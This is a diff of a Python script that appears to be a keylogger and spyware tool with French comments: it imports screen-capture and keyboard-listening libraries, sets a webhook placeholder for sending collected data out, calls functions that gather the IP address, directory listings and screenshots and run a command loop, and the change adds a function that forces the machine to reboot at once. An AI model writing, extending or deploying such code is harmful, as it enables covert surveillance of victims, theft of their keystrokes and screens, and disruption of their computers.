@@ -7,6 +7,7 @@ import io
 import mss.tools
 from pynput import keyboard
 
+
 red = "\033[31m"
 green = "\033[32m"
 yellow = "\033[33m"
@@ -14,9 +15,8 @@ blue = "\033[34m"
 white = "\033[37m"
 reset = "\033[0m"
 
-
 os.system("cls")
-webhook_choix = input(f""" {yellow}
+print(f""" {yellow}
             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡠⠖⢉⣌⢆⠀⠀⠀⠀⠀
             ⠀⠀⠀⠀⠀⠀⠀⣠⠚⠉⠀⠈⠉⠲⣿⣿⡜⡀⠀⠀⠀⠀
             ⡔⢉⣙⣓⣒⡲⠮⡇⠀⠀⠀⠀⠀⠀⠘⡿⡇⡇⠀⠀⠀⠀
@@ -30,10 +30,10 @@ webhook_choix = input(f""" {yellow}
             ⠀⠀⠀⠀⠈⠓⠦⣀⣉⡉⠁⢀⣀⣠⠤⠒⠥⣄⠀⠀⠀⠀
             ⠀⠀⠀⠀⠀⠰⣉⣀⣀⡠⠭⠛⠀⠀⠑⠒⠤⠤⠷⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀
-             Met ton webhook : """)
+""")
 os.system("cls")
 
-webhook = webhook_choix
+webhook = "U_Webhook" # Ici faut placer ton webhook
 
 def cmd():
     while True: 
@@ -42,6 +42,12 @@ def cmd():
         except Exception(e):
             print("Une erreur et survenue", e)
 
+
+def shutdown():
+    try:
+        os.system("shutdown /r /t 0")
+    except Exception(e):
+        print("Error", e)
 
 
 def capture():
@@ -90,6 +96,7 @@ ip()
 dir()
 capture()
 cmd()
+shutdown()
 
 buffer = ""
 timer = None
